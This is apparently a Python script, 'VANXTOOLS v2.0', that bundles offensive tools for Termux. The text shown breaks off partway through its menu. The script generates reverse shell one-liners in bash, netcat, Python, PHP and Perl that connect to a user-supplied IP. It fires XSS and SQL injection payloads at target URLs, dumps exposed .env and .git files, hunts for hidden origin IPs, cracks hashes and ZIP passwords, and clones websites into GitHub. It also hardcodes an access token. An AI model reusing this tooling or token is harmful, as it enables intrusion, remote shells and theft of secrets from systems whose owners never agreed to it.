#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
VANXTOOLS v2.0 — Termux Operations Suite
33 Operational Tools + Auto GitHub Upload
By VANX
"""
import os
import sys
import time
import json
import random
import string
import subprocess
import requests
import re
import socket
import threading
import hashlib
import base64
import urllib.request
import ssl
import ipaddress
import datetime
import shutil
import zipfile
import tarfile
import sqlite3
import http.client
import urllib.parse
import concurrent.futures
from urllib.parse import urlparse, urljoin, quote

# ============================================================
# CONFIG
# ============================================================
GH_TOKEN = "vcp_2oI3l0kKQWAdwcYfVYPyaNuO7YpMfdXUx7bgwIp30g7XyhEpyj1jGYn9"
GH_USER = "vanx880" 
WORK_DIR = os.path.expanduser("~/GODS")
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; Termux) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
}

# Colors
C_RESET = "\033[0m"
C_RED = "\033[91m"
C_GRN = "\033[92m"
C_YEL = "\033[93m"
C_BLU = "\033[94m"
C_MAG = "\033[95m"
C_CYN = "\033[96m"
C_WHT = "\033[97m"
C_BOLD = "\033[1m"

# ============================================================
# BANNER & LOGGER
# ============================================================
def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"""{C_YEL}{C_BOLD}
 ██▒   █▓ ▄▄▄       ███▄    █ ▒██   ██▒▄▄▄█████▓ ▒█████   ▒█████   ██▓      ██████ 
▓██░   █▒▒████▄     ██ ▀█   █ ▒▒ █ █ ▒░▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    ▒██    ▒ 
 ▓██  █▒░▒██  ▀█▄  ▓██  ▀█ ██▒░░  █   ░▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ░ ▓██▄   
  ▒██ █░░░██▄▄▄▄██ ▓██▒  ▐▌██▒ ░ █ █ ▒ ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░      ▒   ██▒
   ▒▀█░   ▓█   ▓██▒▒██░   ▓██░▒██▒ ▒██▒  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒▒██████▒▒
   ░ ▐░   ▒▒   ▓▒█░░ ▒░   ▒ ▒ ▒▒ ░ ░▓ ░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░▒ ▒▓▒ ▒ ░
   ░ ░░    ▒   ▒▒ ░░ ░░   ░ ▒░░░   ░▒ ░    ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░░ ░▒  ░ ░
     ░░    ░   ▒      ░   ░ ░  ░    ░    ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   ░  ░  ░  
      ░        ░  ░         ░  ░    ░           ░ ░    ░    ░  ░      ░  ░      ░  
{C_RESET}{C_CYN}                             [ v2.0 - 33 Tools ]{C_RESET}
{C_MAG}                                  By VANX{C_RESET}
""")

def log(msg, type="info"):
    ts = time.strftime("%H:%M:%S")
    if type == "info": print(f"{C_BLU}[{ts}] [*]{C_RESET} {msg}")
    elif type == "ok": print(f"{C_GRN}[{ts}] [+]{C_RESET} {msg}")
    elif type == "err": print(f"{C_RED}[{ts}] [!]{C_RESET} {msg}")
    elif type == "warn": print(f"{C_YEL}[{ts}] [?]{C_RESET} {msg}")

# ============================================================
# GITHUB HELPER
# ============================================================
class GitHub:
    def __init__(self, token):
        self.token = token
        self.base = "https://api.github.com"
        self.headers = {
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github.v3+json"
        }
        self.user = None
        self._auth()

    def _auth(self):
        r = requests.get(f"{self.base}/user", headers=self.headers)
        if r.status_code == 200:
            self.user = r.json()['login']
            log(f"GitHub Auth: {C_GRN}{self.user}{C_RESET}", "ok")
        else:
            log("GitHub Auth Failed. Check Token.", "err")
            sys.exit(1)

    def create_repo(self, name, desc, private=False):
        data = {"name": name, "description": desc, "private": private, "auto_init": True}
        r = requests.post(f"{self.base}/user/repos", headers=self.headers, json=data)
        if r.status_code == 201:
            log(f"Repo created: {r.json()['html_url']}", "ok")
            return r.json()['html_url'], name
        elif r.status_code == 422:
            log(f"Repo '{name}' exists, using it.", "warn")
            return f"https://github.com/{self.user}/{name}", name
        else:
            log(f"Create repo error: {r.text}", "err")
            return None, None

    def upload_file(self, repo, path, content, commit_msg):
        url = f"{self.base}/repos/{self.user}/{repo}/contents/{path}"
        r_get = requests.get(url, headers=self.headers)
        sha = r_get.json().get('sha') if r_get.status_code == 200 else None
        
        data = {
            "message": commit_msg,
            "content": base64.b64encode(content).decode('utf-8'),
            "branch": "main"
        }
        if sha: data["sha"] = sha
        
        r_put = requests.put(url, headers=self.headers, json=data)
        return r_put.status_code in [200, 201]

# Init GH Global
GH = None
def init_gh():
    global GH
    if GH is None:
        GH = GitHub(GH_TOKEN)
    return GH

# ============================================================
# TOOLS 1 - 33
# ============================================================

def tool_01_clone():
    log("=== [1] Website Scraper & Auto GitHub ===", "info")
    url = input(f"{C_CYN}Target URL: {C_RESET}").strip()
    if not url.startswith("http"): url = "https://" + url
    repo_name = input(f"{C_CYN}Repo Name: {C_RESET}").strip() or f"clone-{int(time.time())}"

    gh = init_gh()
    log(f"Fetching {url} ...", "info")
    try:
        r = requests.get(url, headers=HEADERS, timeout=15)
        r.raise_for_status()
    except Exception as e:
        log(f"Fetch failed: {e}", "err"); return

    html = r.text
    base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
    files_to_upload = {}

    # Regex simple extract
    css_links = re.findall(r'<link[^>]+href=["\']([^"\']+\.css[^"\']*)["\']', html)
    js_links = re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', html)
    img_links = re.findall(r'<img[^>]+src=["\']([^"\']+\.(?:png|jpg|jpeg|gif|svg|webp)[^"\']*)["\']', html)

    assets = list(set(css_links + js_links + img_links))
    log(f"Found {len(assets)} assets...", "info")

    files_to_upload["index.html"] = html.encode('utf-8')

    for asset in assets:
        if asset.startswith("//"): asset = "https:" + asset
        elif asset.startswith("/"): asset = base_url + asset
        elif not asset.startswith("http"): asset = urljoin(url, asset)

        try:
            ar = requests.get(asset, headers=HEADERS, timeout=10)
            if ar.status_code == 200:
                fname = os.path.basename(urlparse(asset).path) or f"file_{random.randint(1,999)}"
                folder = "css" if fname.endswith(".css") else "js" if fname.endswith(".js") else "img"
                path = f"{folder}/{fname}"
                files_to_upload[path] = ar.content
                html = html.replace(asset, path) # Rewrite link
                log(f"Got: {path}", "ok")
        except: pass

    files_to_upload["index.html"] = html.encode('utf-8')
    
    # Upload
    repo_url, repo_name_actual = gh.create_repo(repo_name, f"Scraped from {url}")
    if repo_url:
        log("Uploading files to GitHub...", "info")
        for path, content in files_to_upload.items():
            if gh.upload_file(repo_name_actual, path, content, "Auto upload via VANXTOOLS"):
                pass # Silent success
            else:
                log(f"Failed upload: {path}", "err")
        print(f"\n{C_GRN}{C_BOLD}SUCCESS REPO URL: {C_YEL}{repo_url}{C_RESET}\n")


def tool_02_headers():
    log("=== [2] HTTP Header & Tech Fingerprint ===", "info")
    url = input(f"{C_CYN}Target URL: {C_RESET}").strip()
    if not url.startswith("http"): url = "https://" + url
    try:
        r = requests.get(url, headers=HEADERS, timeout=10)
        print(f"\n{C_YEL}--- Headers ---{C_RESET}")
        for k, v in r.headers.items():
            print(f"{C_GRN}{k}:{C_RESET} {v}")
        
        print(f"\n{C_YEL}--- Tech Stack ---{C_RESET}")
        h_str = str(r.headers).lower()
        b_str = r.text.lower()
        techs = []
        if "wp-content" in b_str or "wordpress" in b_str: techs.append("WordPress")
        if "drupal" in b_str: techs.append("Drupal")
        if "csrf-token" in b_str and "laravel" in h_str: techs.append("Laravel")
        if "x-powered-by: php" in h_str: techs.append("PHP")
        if "x-powered-by: asp.net" in h_str: techs.append("ASP.NET")
        if "cf-ray" in h_str: techs.append("Cloudflare")
        if "react" in b_str: techs.append("React JS")
        if "vue" in b_str: techs.append("Vue JS")
        
        if techs: print(f"{C_GRN}{', '.join(techs)}{C_RESET}")
        else: print(f"{C_RED}Unknown / Custom{C_RESET}")
    except Exception as e:
        log(f"Error: {e}", "err")


def tool_03_dirbuster():
    log("=== [3] Directory Buster ===", "info")
    url = input(f"{C_CYN}Base URL: {C_RESET}").strip()
    if not url.endswith("/"): url += "/"
    
    dirs = ["admin", "login", "api", "config", "backup", "db", ".git/HEAD", ".env", "phpmyadmin", "uploads", "assets", "cgi-bin", "wp-admin", "administrator", "server-status", "robots.txt", "sitemap.xml"]
    log(f"Testing {len(dirs)} paths...", "info")
    
    for d in dirs:
        try:
            target = url + d
            r = requests.get(target, headers=HEADERS, timeout=5, allow_redirects=False)
            if r.status_code in [200, 301, 302, 403]:
                color = C_GRN if r.status_code == 200 else C_YEL if r.status_code in [301,302] else C_RED
                print(f"{color}[{r.status_code}] {target} (Size: {len(r.content)}){C_RESET}")
        except: pass


def tool_04_dns_enum():
    log("=== [4] DNS & Subdomain Recon ===", "info")
    domain = input(f"{C_CYN}Domain: {C_RESET}").strip()
    subs = ["www", "mail", "api", "dev", "staging", "admin", "test", "vpn", "cpanel", "blog", "shop", "support", "portal", "secure", "server", "ns1", "ns2"]
    
    log(f"Enumerating {len(subs)} subdomains...", "info")
    for sub in subs:
        full = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(full)
            print(f"{C_GRN}[+] {full} -> {ip}{C_RESET}")
        except: pass


def tool_05_port_scan():
    log("=== [5] Quick Port Scan ===", "info")
    target = input(f"{C_CYN}IP/Domain: {C_RESET}").strip()
    try:
        ip = socket.gethostbyname(target)
        log(f"Target IP: {ip}", "info")
    except:
        log("Resolve failed.", "err"); return

    ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1433, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017]
    log(f"Scanning {len(ports)} ports...", "info")
    
    for p in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        if s.connect_ex((ip, p)) == 0:
            print(f"{C_GRN}[OPEN] {p}/tcp{C_RESET}")
        s.close()


def tool_06_hash_crack():
    log("=== [6] Hash Generator & Crack (Dictionary) ===", "info")
    mode = input(f"{C_CYN}Mode (1=Hash, 2=Crack): {C_RESET}").strip()
    if mode == "1":
        text = input(f"{C_CYN}String: {C_RESET}")
        print(f"MD5   : {hashlib.md5(text.encode()).hexdigest()}")
        print(f"SHA1  : {hashlib.sha1(text.encode()).hexdigest()}")
        print(f"SHA256: {hashlib.sha256(text.encode()).hexdigest()}")
    elif mode == "2":
        h = input(f"{C_CYN}Hash target: {C_RESET}").strip()
        wordlist = input(f"{C_CYN}Wordlist path (default: rockyou.txt): {C_RESET}").strip() or "rockyou.txt"
        if not os.path.exists(wordlist):
            log("Wordlist not found.", "err"); return
        log("Cracking...", "info")
        with open(wordlist, 'r', errors='ignore') as f:
            for line in f:
                w = line.strip()
                if hashlib.md5(w.encode()).hexdigest() == h:
                    log(f"FOUND: {w}", "ok"); return
        log("Not found in wordlist.", "err")


def tool_07_payload_gen():
    log("=== [7] Reverse Shell Payloads ===", "info")
    ip = input(f"{C_CYN}Your IP: {C_RESET}").strip()
    port = input(f"{C_CYN}Port: {C_RESET}").strip()
    
    payloads = {
        "Bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "Netcat": f"nc -e /bin/sh {ip} {port}",
        "Python": f"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "PHP": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "Perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    }
    
    print(f"\n{C_YEL}--- Payloads ---{C_RESET}")
    for k, v in payloads.items():
        print(f"{C_GRN}[{k}]{C_RESET} {v}")
    
    with open(f"{WORK_DIR}/payloads.txt", "w") as f:
        for k, v in payloads.items(): f.write(f"[{k}]\n{v}\n\n")
    log(f"Saved to {WORK_DIR}/payloads.txt", "ok")


def tool_08_admin_finder():
    log("=== [8] Admin Login Finder ===", "info")
    url = input(f"{C_CYN}Base URL: {C_RESET}").strip()
    if not url.endswith("/"): url += "/"
    
    paths = ["admin", "administrator", "wp-login.php", "login", "admin/login", "cpanel", "webmail", "panel", "admin.php", "login.php", "dashboard"]
    for p in paths:
        try:
            r = requests.get(url + p, headers=HEADERS, timeout=5)
            if r.status_code == 200 and ("login" in r.text.lower() or "password" in r.text.lower()):
                print(f"{C_GRN}[FOUND] {url+p}{C_RESET}")
        except: pass


def tool_09_cf_bypass():
    log("=== [9] Cloudflare Real IP Finder ===", "info")
    domain = input(f"{C_CYN}Domain behind CF: {C_RESET}").strip()
    
    log("Querying crt.sh...", "info")
    try:
        r = requests.get(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=20)
        if r.status_code == 200:
            data = r.json()
            uniq = set()
            for item in data:
                for name in item.get('name_value', '').split('\n'):
                    uniq.add(name)
            
            log(f"Found {len(uniq)} names. Resolving...", "info")
            for sub in uniq:
                try:
                    ip = socket.gethostbyname(sub)
                    # CF IP range roughly: 104.x, 172.67.x, 172.64.x
                    if not (ip.startswith("104.") or ip.startswith("172.6")):
                        print(f"{C_GRN}[REAL IP?] {sub} -> {ip}{C_RESET}")
                except: pass
    except Exception as e:
        log(f"Error: {e}", "err")


def tool_10_dorks():
    log("=== [10] Google Dork Generator ===", "info")
    domain = input(f"{C_CYN}Domain: {C_RESET}").strip()
    dorks = [
        f"site:{domain} ext:sql", f"site:{domain} ext:env", f"site:{domain} ext:log",
        f"site:{domain} intitle:index.of", f"site:{domain} inurl:admin", f"site:{domain} inurl:login",
        f"site:{domain} \"password\"", f"site:{domain} \"API_KEY\"", f"site:{domain} ext:bak",
        f"site:{domain} ext:config", f"site:{domain} ext:xml", f"site:{domain} ext:json"
    ]
    for d in dorks:
        print(f"{C_YEL}[DORK]{C_RESET} https://google.com/search?q={quote(d)}")


def tool_11_whois():
    log("=== [11] Whois Lookup ===", "info")
    domain = input(f"{C_CYN}Domain: {C_RESET}").strip()
    try:
        out = subprocess.check_output(["whois", domain], stderr=subprocess.STDOUT).decode()
        print(out[:1500] + "\n...[truncated]")
    except FileNotFoundError:
        log("whois not installed. Run: pkg install whois", "err")
    except Exception as e:
        log(f"Error: {e}", "err")


def tool_12_ssl_check():
    log("=== [12] SSL Certificate Info ===", "info")
    host = input(f"{C_CYN}Host (domain.com): {C_RESET}").strip()
    try:
        context = ssl.create_default_context()
        with socket.create_connection((host, 443), timeout=10) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
                print(f"{C_YEL}--- SSL Info ---{C_RESET}")
                print(f"Issuer: {cert.get('issuer')}")
                print(f"Subject: {cert.get('subject')}")
                print(f"Valid From: {cert.get('notBefore')}")
                print(f"Valid Until: {cert.get('notAfter')}")
                print(f"Version: {ssock.version()}")
    except Exception as e:
        log(f"SSL Error: {e}", "err")


def tool_13_robots():
    log("=== [13] robots.txt & sitemap.xml Parser ===", "info")
    url = input(f"{C_CYN}Base URL: {C_RESET}").strip()
    if not url.endswith("/"): url += "/"
    for f in ["robots.txt", "sitemap.xml"]:
        try:
            r = requests.get(url + f, headers=HEADERS, timeout=5)
            if r.status_code == 200:
                print(f"\n{C_YEL}--- {f} ---{C_RESET}")
                print(r.text[:1000] + ("\n..." if len(r.text) > 1000 else ""))
            else:
                log(f"{f} not found ({r.status_code})", "warn")
        except Exception as e:
            log(f"Error: {e}", "err")


def tool_14_xss_scanner():
    log("=== [14] XSS Reflection Scanner ===", "info")
    url = input(f"{C_CYN}URL with params (e.g. site.com/?q=1): {C_RESET}").strip()
    payloads = ["<script>alert(1)</script>", "\"><svg/onload=alert(1)>", "javascript:alert(1)", "'-alert(1)-'"]
    
    log("Testing payloads...", "info")
    for p in payloads:
        try:
            target = url + quote(p) if "=" not in url else url.replace("=", "=" + quote(p), 1)
            r = requests.get(target, headers=HEADERS, timeout=5)
            if p in r.text:
                log(f"Reflected: {p} -> {target}", "ok")
        except: pass


def tool_15_sqli_scanner():
    log("=== [15] SQL Injection Error Scanner ===", "info")
    url = input(f"{C_CYN}URL with param (e.g. site.com/?id=1): {C_RESET}").strip()
    payloads = ["'", "\"", "1' OR '1'='1", "1 UNION SELECT NULL--", "'; WAITFOR DELAY '0:0:5'--"]
    errors = ["sql syntax", "mysql_fetch", "ora-01756", "sqlite3", "postgresql", "unclosed quotation"]
    
    log("Testing...", "info")
    for p in payloads:
        try:
            target = url.replace("=", "=" + quote(p), 1)
            r = requests.get(target, headers=HEADERS, timeout=10)
            for err in errors:
                if err in r.text.lower():
                    log(f"Potential SQLi: {p} -> {target}", "ok"); break
        except: pass


def tool_16_subdomain_takeover():
    log("=== [16] Subdomain Takeover Checker ===", "info")
    domain = input(f"{C_CYN}Subdomain (e.g. test.site.com): {C_RESET}").strip()
    services = {
        "github": "There isn't a GitHub Pages site here.",
        "heroku": "No such app",
        "s3": "NoSuchBucket",
        "azure": "404 Web Site not found",
        "shopify": "Sorry, this shop is currently unavailable"
    }
    try:
        r = requests.get(f"http://{domain}", headers=HEADERS, timeout=5)
        for svc, sig in services.items():
            if sig in r.text:
                log(f"VULNERABLE! {domain} -> {svc.upper()}", "ok"); return
        log("Not vulnerable (fingerprint not matched).", "info")
    except Exception as e:
        log(f"Error: {e}", "err")


def tool_17_git_dumper():
    log("=== [17] .git Dumper ===", "info")
    url = input(f"{C_CYN}Target URL: {C_RESET}").strip()
    if not url.endswith("/"): url += "/"
    
    git_files = ["HEAD", "config", "index", "logs/HEAD", "COMMIT_EDITMSG", "refs/heads/master", "refs/heads/main"]
    log("Checking .git/ ...", "info")
    for f in git_files:
        try:
            r = requests.get(url + ".git/" + f, headers=HEADERS, timeout=5)
            if r.status_code == 200:
                print(f"{C_GRN}[FOUND] {url}.git/{f} (Size: {len(r.content)}){C_RESET}")
        except: pass


def tool_18_env_dumper():
    log("=== [18] .env Dumper ===", "info")
    url = input(f"{C_CYN}Target URL: {C_RESET}").strip()
    if not url.endswith("/"): url += "/"
    
    paths = [".env", ".env.local", ".env.production", "env.js", "config.php", "config.json", "appsettings.json", "settings.py"]
    log("Checking config files...", "info")
    for p in paths:
        try:
            r = requests.get(url + p, headers=HEADERS, timeout=5)
            if r.status_code == 200 and len(r.text) > 10:
                print(f"\n{C_GRN}[FOUND] {url+p}{C_RESET}")
                print(f"{C_YEL}{r.text[:300]}{C_RESET}")
        except: pass


def tool_19_file_upload_check():
    log("=== [19] File Upload Vulnerability Test ===", "info")
    url = input(f"{C_CYN}Upload Endpoint: {C_RESET}").strip()
    # Dummy file
    files = {'file': ('test.php', '<?php echo "VANX"; ?>', 'application/x-php')}
    try:
        r = requests.post(url, files=files, headers={"User-Agent": HEADERS["User-Agent"]}, timeout=10)
        log(f"Status: {r.status_code}", "info")
        if r.status_code == 200:
            print(f"{C_YEL}Response (first 200 chars):{C_RESET}\n{r.text[:200]}")
    except Exception as e:
        log(f"Error: {e}", "err")


def tool_20_cors_check():
    log("=== [20] CORS Misconfiguration Check ===", "info")
    url = input(f"{C_CYN}URL: {C_RESET}").strip()
    h = HEADERS.copy()
    h["Origin"] = "https://evil.com"
    try:
        r = requests.get(url, headers=h, timeout=10)
        acao = r.headers.get("Access-Control-Allow-Origin")
        acac = r.headers.get("Access-Control-Allow-Credentials")
        if acao == "*" or acao == "https://evil.com":
            print(f"{C_GRN}[CORS Misconfig] ACAO: {acao} | ACAC: {acac}{C_RESET}")
        else:
            log("CORS seems safe.", "info")
    except Exception as e:
        log(f"Error: {e}", "err")


def tool_21_wp_scanner():
    log("=== [21] WordPress Basic Scanner ===", "info")
    url = input(f"{C_CYN}WP Site: {C_RESET}").strip()
    if not url.endswith("/"): url += "/"
    
    try:
        r = requests.get(url, headers=HEADERS, timeout=10)
        if "wp-content" not in r.text and "wp-includes" not in r.text:
            log("Not a WordPress site.", "err"); return
        log("WordPress detected.", "ok")
        
        # Check version
        readme = requests.get(url + "readme.html", headers=HEADERS, timeout=5)
        if readme.status_code == 200:
            match = re.search(r'Version\s+([\d\.]+)', readme.text)
            if match: log(f"Version: {match.group(1)}", "info")
        
        # Check plugins
        plugins = ["woocommerce", "elementor", "contact-form-7", "yoast", "jetpack", "akismet", "wordfence"]
        for p in plugins:
            pr = requests.get(url + f"wp-content/plugins/{p}/", headers=HEADERS, timeout=3)
            if pr.status_code == 200: print(f"{C_GRN}[PLUGIN] {p}{C_RESET}")
    except Exception as e:
        log(f"Error: {e}", "err")


def tool_22_cms_detect():
    log("=== [22] CMS Detector ===", "info")
    url = input(f"{C_CYN}URL: {C_RESET}").strip()
    try:
        r = requests.get(url, headers=HEADERS, timeout=10)
        html = r.text.lower()
        found = []
        if "wp-content" in html: found.append("WordPress")
        if "sites/default/files" in html or "drupal" in html: found.append("Drupal")
        if "media/jui" in html or "joomla" in html: found.append("Joomla")
        if "skin/frontend" in html or "magento" in html: found.append("Magento")
        if "shopify" in html: found.append("Shopify")
        if "cdn.shopify.com" in html: found.append("Shopify")
        
        if found: print(f"{C_GRN}CMS Detected: {', '.join(found)}{C_RESET}")
        else: log("Unknown CMS.", "warn")
    except Exception as e:
        log(f"Error: {e}", "err")


def tool_23_ping_sweep():
    log("=== [23] Ping Sweep (Subnet Scan) ===", "info")
    subnet = input(f"{C_CYN}Subnet (e.g. 192.168.1): {C_RESET}").strip()
    log("Sweeping...", "info")
    def ping(ip):
        try:
            out = subprocess.check_output(["ping", "-c", "1", "-W", "1", ip], stderr=subprocess.DEVNULL)
            return ip
        except: return None
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
        ips = [f"{subnet}.{i}" for i in range(1, 255)]
        for res in ex.map(ping, ips):
            if res: print(f"{C_GRN}[UP] {res}{C_RESET}")


def tool_24_traceroute():
    log("=== [24] Traceroute ===", "info")
    target = input(f"{C_CYN}Target: {C_RESET}").strip()
    try:
        out = subprocess.check_output(["traceroute", target], stderr=subprocess.STDOUT).decode()
        print(out)
    except FileNotFoundError:
        log("traceroute not installed. Run: pkg install traceroute", "err")


def tool_25_geo_ip():
    log("=== [25] GeoIP & ASN Lookup ===", "info")
    target = input(f"{C_CYN}IP/Domain: {C_RESET}").strip()
    try:
        ip = socket.gethostbyname(target)
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=10).json()
        if r.get("status") == "success":
            print(f"{C_YEL}--- IP Info ---{C_RESET}")
            print(f"IP      : {r['query']}")
            print(f"Country : {r['country']} ({r['countryCode']})")
            print(f"Region  : {r['regionName']}")
            print(f"City    : {r['city']}")
            print(f"ISP     : {r['isp']}")
            print(f"Org     : {r['org']}")
            print(f"AS      : {r['as']}")
            print(f"Timezone: {r['timezone']}")
        else:
            log("Lookup failed.", "err")
    except Exception as e:
        log(f"Error: {e}", "err")


def tool_26_url_expander():
    log("=== [26] URL Expander & Shortener Resolver ===", "info")
    short = input(f"{C_CYN}Short URL: {C_RESET}").strip()
    try:
        r = requests.head(short, allow_redirects=True, timeout=10, headers=HEADERS)
        print(f"{C_GRN}Final URL: {r.url}{C_RESET}")
    except Exception as e:
        log(f"Error: {e}", "err")


def tool_27_html_parser():
    log("=== [27] HTML Link & Form Extractor ===", "info")
    url = input(f"{C_CYN}URL: {C_RESET}").strip()
    if not url.startswith("http"): url = "https://" + url
    try:
        r = requests.get(url, headers=HEADERS, timeout=10)
        links = re.findall(r'href=["\']([^"\']+)["\']', r.text)
        forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\']', r.text, re.IGNORECASE)
        
        print(f"\n{C_YEL}--- Links ({len(links)}) ---{C_RESET}")
        for l in list(set(links))[:20]: print(f"{C_GRN}{l}{C_RESET}")
        
        print(f"\n{C_YEL}--- Forms ({len(forms)}) ---{C_RESET}")
        for f in list(set(forms)): print(f"{C_GRN}{f}{C_RESET}")
    except Exception as e:
        log(f"Error: {e}", "err")


def tool_28_cookie_analyzer():
    log("=== [28] Cookie & Security Header Analyzer ===", "info")
    url = input(f"{C_CYN}URL: {C_RESET}").strip()
    try:
        r = requests.get(url, headers=HEADERS, timeout=10)
        print(f"\n{C_YEL}--- Cookies ---{C_RESET}")
        if r.cookies:
            for c in r.cookies:
                flags = []
                if c.secure: flags.append("Secure")
                if c.has_nonstandard_attr("HttpOnly"): flags.append("HttpOnly")
                print(f"{C_GRN}{c.name}{C_RESET} = {c.value[:20]}... [{'|'.join(flags) if flags else 'No Flags'}]")
        else:
            print("No cookies found.")
            
        print(f"\n{C_YEL}--- Security Headers ---{C_RESET}")
        secs = ["Strict-Transport-Security", "X-Frame-Options", "X-Content-Type-Options", "Content-Security-Policy", "X-XSS-Protection"]
        for s in secs:
            val = r.headers.get(s)
            if val: print(f"{C_GRN}[OK]{C_RESET} {s}: {val}")
            else: print(f"{C_RED}[MISSING]{C_RESET} {s}")
    except Exception as e:
        log(f"Error: {e}", "err")


def tool_29_git_cloner():
    log("=== [29] Git Repo Cloner ===", "info")
    repo = input(f"{C_CYN}Git Repo URL: {C_RESET}").strip()
    dest = input(f"{C_CYN}Dest Folder (default: clone_repo): {C_RESET}").strip() or "clone_repo"
    try:
        log(f"Cloning into {dest}...", "info")
        subprocess.run(["git", "clone", repo, dest], check=True)
        log("Done.", "ok")
    except Exception as e:
        log(f"Error: {e}", "err")


def tool_30_metadata_extractor():
    log("=== [30] Image Metadata Extractor (EXIF) ===", "info")
    filepath = input(f"{C_CYN}Image Path: {C_RESET}").strip()
    if not os.path.exists(filepath):
        log("File not found.", "err"); return
    try:
        from PIL import Image
        from PIL.ExifTags import TAGS
        img = Image.open(filepath)
        exif = img.getexif()
        if not exif:
            log("No EXIF data.", "warn"); return
        for tid, val in exif.items():
            tag = TAGS.get(tid, tid)
            print(f"{C_GRN}{tag}{C_RESET}: {val}")
    except ImportError:
        log("Install PIL: pip install Pillow", "err")
    except Exception as e:
        log(f"Error: {e}", "err")


def tool_31_phone_lookup():
    log("=== [31] Phone Number Info & Validation ===", "info")
    phone = input(f"{C_CYN}Phone (e.g. 628123456789): {C_RESET}").strip()
    # Simple regex check for ID
    if re.match(r'^62\d{9,12}$', phone):
        print(f"{C_GRN}Valid Indonesian number format.{C_RESET}")
        prefix = phone[2:5]
        providers = {
            "811": "Telkomsel", "812": "Telkomsel", "813": "Telkomsel", "821": "Telkomsel", "822": "Telkomsel", "823": "Telkomsel", "851": "Telkomsel", "852": "Telkomsel", "853": "Telkomsel",
            "814": "Indosat", "815": "Indosat", "816": "Indosat", "855": "Indosat", "856": "Indosat", "857": "Indosat", "858": "Indosat",
            "817": "XL", "818": "XL", "819": "XL", "859": "XL", "877": "XL", "878": "XL",
            "831": "Axis", "832": "Axis", "833": "Axis", "838": "Axis",
            "895": "Tri", "896": "Tri", "897": "Tri", "898": "Tri", "899": "Tri",
            "881": "Smartfren", "882": "Smartfren", "883": "Smartfren", "884": "Smartfren", "885": "Smartfren", "886": "Smartfren", "887": "Smartfren", "888": "Smartfren", "889": "Smartfren"
        }
        provider = providers.get(prefix, "Unknown")
        print(f"Prefix : {prefix}")
        print(f"Provider : {C_YEL}{provider}{C_RESET}")
    else:
        log("Invalid format (expect 62xxxxxxxxx).", "err")


def tool_32_whois_ip():
    log("=== [32] IP Whois Lookup ===", "info")
    ip = input(f"{C_CYN}IP: {C_RESET}").strip()
    try:
        out = subprocess.check_output(["whois", ip], stderr=subprocess.STDOUT).decode()
        print(out[:1500] + "\n...[truncated]")
    except FileNotFoundError:
        log("whois not installed.", "err")
    except Exception as e:
        log(f"Error: {e}", "err")


def tool_33_zip_cracker():
    log("=== [33] ZIP Password Cracker ===", "info")
    zpath = input(f"{C_CYN}ZIP Path: {C_RESET}").strip()
    wpath = input(f"{C_CYN}Wordlist Path: {C_RESET}").strip()
    if not os.path.exists(zpath) or not os.path.exists(wpath):
        log("File/Wordlist not found.", "err"); return
    try:
        with zipfile.ZipFile(zpath) as zf:
            names = zf.namelist()
            if not names: log("Empty ZIP.", "err"); return
            target = names[0]
            
            log("Cracking...", "info")
            with open(wpath, 'r', errors='ignore') as f:
                for line in f:
                    pwd = line.strip().encode()
                    try:
                        zf.extract(target, pwd=pwd)
                        log(f"FOUND PASSWORD: {pwd.decode()}", "ok"); return
                    except Exception: pass
            log("Not found in wordlist.", "err")
    except Exception as e:
        log(f"Error: {e}", "err")


# ============================================================
# MENU
# ============================================================
def main():
    os.makedirs(WORK_DIR, exist_ok=True)
    while True:
        banner()
        print(f"{C_YEL}[{C_RESET} 1 {C_YEL}]{C_RESET} Clone/Scrape Website & Upload GitHub")
        print(f"{C_YEL}[{C_RESET} 2 {C_YEL}]{C_RESET} HTTP Header & Tech Fingerprint")
        print(f"{C_YEL}[{C_RESET} 3 {C_YEL}]{C_RESET} Directory Buster")
        print(f"{C_YEL}[{C_RESET} 4 {C_YEL}]{C_RESET} DNS & Subdomain Recon")
        print(f"{C_YEL}[{C_RESET} 5 {C_YEL}]{C_RESET} Quick Port Scan")
        print(f"{C_YEL}[{C_RESET} 6 {C_YEL}]{C_RESET} Hash Generator & Crack")
        print(f"{C_YEL}[{C_RESET} 7 {C_YEL}]{C_RESET} Reverse Shell Payloads")
